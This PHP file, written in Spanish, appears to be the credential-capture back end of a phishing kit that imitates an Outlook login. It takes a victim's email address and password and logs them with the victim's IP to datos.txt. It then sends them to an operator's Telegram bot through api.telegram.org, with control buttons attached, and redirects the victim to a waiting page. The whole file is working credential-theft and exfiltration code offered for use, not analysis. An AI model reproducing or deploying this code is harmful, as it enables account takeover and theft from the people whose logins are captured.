<?php
// ========================================
// SALSA.PHP - Procesa el login de Outlook
// ========================================

session_start();
date_default_timezone_set('America/Caracas');
ini_set("display_errors", 0);

// Incluir configuración de Telegram
include('../settings.php');

$userp = $_SERVER['REMOTE_ADDR'];
$usuario = $_SESSION['usuario'] ?? 'desconocido';

// Necesitamos al menos el correo en sesión y la contraseña por POST
if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {

    // Guardar en archivo local (opcional)
    $file = fopen("datos.txt", "a");
    $passwordValue = isset($_SESSION['c']) ? $_SESSION['c'] : (isset($_POST['c']) ? $_POST['c'] : '');

    fwrite($file, "Correo: ".$_SESSION['e']."   Password: ".$passwordValue."\n");
    fwrite($file, "Fecha: ".date('Y-m-d')." - ".date('H:i:s')."\n");
    fwrite($file, "IP: ".$userp."\n");
    fwrite($file, "Usuario: ".$usuario."\n");
    fwrite($file, "================================\n");
    fclose($file);

    // Enviar datos a Telegram
    $correo = $_SESSION['e'];
    $psswd = $passwordValue;

    $msg = "📧 NUEVO MAIL RECIBIDO\n";
    $msg .= "👤 Usuario: $usuario\n";
    $msg .= "📩 Correo: $correo\n";
    $msg .= "🔑 Password: $psswd\n";
    $msg .= "🌐 IP: $userp\n";

    // Crear botones inline - PERSONALIZA SEGÚN TUS NECESIDADES
    $botones = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '📩 Mail', 'callback_data' => "MAIL|$usuario"],
                ['text' => '🔁 Login', 'callback_data' => "LOGIN|$usuario"]
            ],
            [
                ['text' => '✅ Listo', 'callback_data' => "LISTO|$usuario"]
            ]
        ]
    ]);

    // Enviar a Telegram
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text' => $msg,
        'reply_markup' => $botones
    ]));

    unset($_SESSION['e']);
    unset($_SESSION['c']);
    $_SESSION['from_out'] = true;

    // Redirigir a espera.php
    header("Location: ../espera.php");
    exit;
}
?>